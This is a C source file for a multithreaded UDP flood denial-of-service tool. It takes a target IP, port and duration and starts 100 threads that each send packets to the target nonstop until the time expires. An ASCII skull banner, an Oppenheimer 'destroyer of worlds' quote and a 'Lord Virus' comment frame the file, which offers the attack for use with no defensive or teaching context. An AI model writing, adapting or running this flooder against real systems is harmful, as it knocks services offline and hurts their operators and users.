#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h> 

// Packet buffer size.
#define BUFLEN 1024

// Thread count.
#define THREAD_COUNT 100

// Define error funtion.
void throwScriptError(char *s)
{
  perror(s);
  exit(1);
}

// send an attack pass IP, Port, Time.
void sendAttack(char* params[])
{
    // Declare vars.
    clock_t end_t = clock() + (atoi(params[3]/*Durration*/) * 2) * CLOCKS_PER_SEC;
    struct sockaddr_in sockaddr_in_struct_var;
    int s, i, slen = sizeof(sockaddr_in_struct_var);
    char buf[BUFLEN];

    // Create a UDP socket, throw error if we can not.
    if ((s = socket(AF_INET/*Address family*/, SOCK_DGRAM/*Datagram delivery*/, IPPROTO_UDP/*User Datagram Protocol*/)) == -1)
    {
        throwScriptError("Error creating socket.");
    }

    // Set memory to all 0xFF's at sockaddr_in_struct_var for the etire size of sockaddr_in_struct_var.
    memset((char*)&sockaddr_in_struct_var, 0xFF, sizeof(sockaddr_in_struct_var));

    sockaddr_in_struct_var.sin_family = AF_INET;
    sockaddr_in_struct_var.sin_port = htons(atoi(params[2]/*Port*/));

    // convert server IP to binary address & bind to sin_addr, throw error if we fail.
    if (inet_aton((char*)params[1]/*Ip*/, &sockaddr_in_struct_var.sin_addr) == 0)
    {
        fprintf(stderr, "inet_aton() failed\n");
        exit(1);
    }

    // Keep sending packets until durration is up.
    while (clock() <= end_t)
    {
        // Send the packet, throw error if we fail.
        if (sendto(s, buf, BUFLEN, 0, &sockaddr_in_struct_var, slen) == -1)
        {
            throwScriptError("Error sending packet.");
        }
    }

    close(s);
}
	 

// IP, port, time.
// Lord Virus made this for fun.
int main(int argc, char *argv[])
{           
    printf("\e[38;5;40m                ...                            \n");
    printf("\e[38;5;40m              ;::::;                           \n");
    printf("\e[38;5;40m            ;::::; :;                          \n");
    printf("\e[38;5;40m          ;:::::'   :;                         \n");
    printf("\e[38;5;40m         ;:::::;     ;.                        \n");
    printf("\e[38;5;40m        ,:::::'       ;           OOO\         \n");
    printf("\e[38;5;40m        ::::::;       ;          OOOOO\        \n");
    printf("\e[38;5;40m        ;:::::;       ;         OOOOOOOO       \n");
    printf("\e[38;5;40m       ,;::::::;     ;'         / OOOOOOO      \n");
    printf("\e[38;5;40m     ;:::::::::`. ,,,;.        /  / DOOOOOO    \n");
    printf("\e[38;5;40m   .';:::::::::::::::::;,     /  /     DOOOO   \n");
    printf("\e[38;5;40m  ,::::::;::::::;;;;::::;,   /  /        DOOO  \n");
    printf("\e[38;5;40m ;`::::::`'::::::;;;::::: ,#/  /          DOOO \n");
    printf("\e[38;5;40m :`:::::::`;::::::;;::: ;::#  /            DOOO\n");
    printf("\e[38;5;40m ::`:::::::`;:::::::: ;::::# /              DOO\n");
    printf("\e[38;5;40m `:`:::::::`;:::::: ;::::::#/               DOO\n");
    printf("\e[38;5;40m  :::`:::::::`;; ;:::::::::##                OO\n");
    printf("\e[38;5;40m  ::::`:::::::`;::::::::;:::#                OO\n");
    printf("\e[38;5;40m  `:::::`::::::::::::;'`:;::#                O \n");
    printf("\e[38;5;40m   `:::::`::::::::;' /  / `:#                  \n");
    printf("\e[38;5;40m    ::::::`:::::;'  /  /   `#                  \n");
    printf("\e[38;5;7m  \"I am become death, destroyer of worlds\"    \n");
    printf("        - J. Robert Oppenheimer                \n");

    int i;
    pthread_t thread_id[THREAD_COUNT];

    // Send an attack on 100 threads.
    for (i = 0; i < THREAD_COUNT; i++)
    {
        pthread_create(&thread_id[i], NULL, sendAttack, argv);
    }

    // Wait until all threads are done.
    pthread_exit(NULL);
    return 0;
}